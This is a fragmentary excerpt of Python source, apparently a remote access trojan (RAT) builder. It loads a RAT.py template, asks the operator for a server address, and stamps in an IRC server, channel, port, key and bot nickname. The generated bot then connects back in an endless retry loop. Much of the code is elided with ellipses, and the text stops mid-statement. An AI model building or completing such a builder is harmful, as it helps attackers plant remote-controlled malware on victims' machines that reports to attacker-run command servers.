...
def main(path):
    ...
    if path:
        ...
        if 'windows' in OStype().lower():
            code =open(f'{__file__.replace("generator.py","")}RAT.py','r')
        else :
            code =open(f'{__file__.replace("generator.py","")}RAT.py','r')
    mainCode=code.read()
    selection=input(f"""
...
Enter your selection : """)
    if selection == '1':
        server=input(f"{rgb(255, 213, 128)}\n\n[ * ] Enter the server address : {Fore.RESET}")
        while 1:
            try:
...
def main():
    ...
    processor(irc, "{server}", "{channel}", {port},b"{key.decode()}" , "{botnick}")
while 1:
    try:
        main()
    except : 
